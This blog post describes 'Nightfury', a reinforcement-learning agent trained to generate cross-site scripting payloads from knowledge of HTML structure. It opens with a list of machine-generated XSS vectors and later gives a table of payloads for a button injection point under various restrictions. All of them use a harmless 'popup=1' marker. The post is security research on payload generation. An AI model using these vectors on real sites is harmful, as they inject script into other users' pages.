---
layout: post
title: "Teaching XSS to a machine"
categories: Machine-Learning
tags: hacks
image: "https://web.stanford.edu/group/pdplab/pdphandbook/suttonbarto_rl.png"
---

Even before we start anything, just have a glance at few interesting vectors that were dreamt by a machine learning agent which has structural
knowledge of HTML. Few vectors require user interaction also. I tried to add comments about what I think is special about few of those.

``` html
<body onblur=x onload=popup=1;>
<body onerror=popup=1;><svg/onfocus=import>  <!-- When the svg is clicked, the js fails and body onerror is triggered. WOW!! -->
<body onload=popup=1;>
<body rel='popup=1;'onerror=popup=1; onload=x >
<button autofocus=x onchange='import'onfocus=popup=1; >
<button data=popup=1; id='x'onfocus=popup=1; >
<button onclick=popup=1;>
<canvas onclick="popup=1;">
<embed onfocus='popup=1;'><img
<form formaction=popup=1; onclick=popup=1;><object>  <!-- Involves a click on object -->
<form href='x'onclick=popup=1;><select>
<frameset id="x"onload=popup=1;>
<frameset onload=popup=1;>
<iframe onload=popup=1;>
<img srcset=popup=1; onerror=popup=1;>
<input onclick=popup=1; >
<input onfocus=popup=1; autofocus="x">
<input srcset=x href=x onclick=popup=1; >
<link rel=import href=data:text/html;base64,PHNjcmlwdD5wb3B1cD0xOzwvc2NyaXB0Pg==>  <!-- This is awesome -->
<object onfocus=popup=1;>
<select onclick="popup=1;">
<select onclick=popup=1;>
<source onclick=popup=1; ><frameset/onload=popup=1;>  <!-- Interesting as, agent was trying to find vector with no user interaction and only two allowed spaces in input -->
<svg onclick=popup=1;>
<svg onload=popup=1;>
<video onclick=popup=1;>
```

### Introduction

Let's talk about XSS first. How are you successful in creating a payload for demoing/exploiting a Cross Site Scripting vulnerability? It depends on your
ability to understand the HTML markup and inject a javascript statement in an executional context. If you think about it, your most basic payload starts from
``<script>alert(1);</script>`` to ``<img src=x onerror='alert()'>``.

### Reinforcement Learning

A branch of machine learning in which an agent learns optimum actions for different scenarios based on it's past experiences. A more elegant way of explaining
RL is taken from [here](http://www.cse.unsw.edu.au/~cs9417ml/RL1/introduction.html)

An RL agent learns by interacting with its environment and observing the results of these interactions. This mimics the fundamental way in which
humans (and animals alike) learn. As humans, we have a direct sensori-motor connection to our environment, meaning we can perform actions and witness
the results of these actions on the environment. The idea is commonly known as "cause and effect", and this undoubtedly is the key to building up
knowledge of our environment throughout our lifetime. The "cause and effect" idea can be translated into the following steps for an RL agent:

+ The agent observes an input state
+ An action is determined by a decision making function (policy)
+ The action is performed
+ The agent receives a scalar reward or reinforcement from the environment
+ Information about the reward given for that state / action pair is recorded

By performing actions, and obersving the resulting reward, the policy used to determine the best action for a state can be fine-tuned.
Eventually, if enough states are observed an optimal decision policy will be generated and we will have an agent that performs perfectly in
that particular environment.

### Idea

Consider the following markup ``<div class="INJECTION_POINT">``. By a simple look you are aware that inorder to execute an XSS you come out of the
class attribute context and put a payload. A simple vector in the above scenario is ``"><img src=x onerror=alert()>``. This is very trivial because
of your exposure to HTML markup, so I believed that if I can somehow impart the knowledge of html to an RL agent and let it play with it for few hours,
it should be able to provide some simple XSS payloads in different scenarios.

So, for the same scenario above, the RL agent get a state representation like

```
1_tag: div
1_tag_ap: class
context: attr_value
context: class
```

If the above state representation doesn't make any sense, just ignore it. All it does is try to represent the markup. Now, when I tried it against the
agent that I trained, I got the following payload

``` html
<div class=""><button onclick=popup=1;>
```

Not an optimized payload, as a matter of fact this infact requires user interaction. But this is a good starting point.


### Simplifications

You can just give the set of alphabets and control characters (i.e ',",<,> etc.) as actions and the agent will learn valid HTML if you give negative reward
for all non valid markup that it generates. But for the agent to learn html huge training time is required. Similarly, there are other issues which I will not
go into detail but try to explain the simplifications I applied.

+ To speedup the training time, instead of giving just alphabets I gave all the html tags, attributes as actions.
+ Based on the html parsing, html tags are made available only when the context is a tag name etc..
+ Similarly based on the html parsing attributes and their values are made available only when the context needs one of those.

All the simplifications impart the knowledge of structure of html (XML like structure) only.

### Current State

After training for about **3 hours** with **25 html tags** and **25 attribute names**, the agent aquires good level of knowledge. I provided the following injection
sink ``<button INJECTION_POINT``. Based on different restrictions the agent chooses different actions

| Conditions | Payload |
| No restrictions | ``onclick=popup=1;>`` |
| No user interaction | ``><svg onload='popup=1;'>`` |
| No user interaction + No space | ``><iframe/onload='popup=1'>`` |
| No user interaction + No space + No Quotes | ``><iframe/onload=popup=1>`` |
| No user interaction + No 'onload' | ``><input autofocus='x' onfocus=popup=1;>`` |

### Future Work (Planned so far!)

+ Shift to a sparse sampling way to speed up learning.
+ If RlPy is not being suited, shift to [**Theano**](http://deeplearning.net/software/theano/) and use [**Lasagne**](http://lasagne.readthedocs.org/en/latest/)  for neural network to remember the value function.
+ A better state representation of only javascript might be interesting to try out. Why? Because AngularJS has a top notch sandbox to test against!!

I am calling this project as [**Nightfury**](https://github.com/tunnelshade/nightfury) and planning to write a detailed technical blog post on how this has
been achieved so far. The github repo needs some cleanup, but as of now please bear with this!
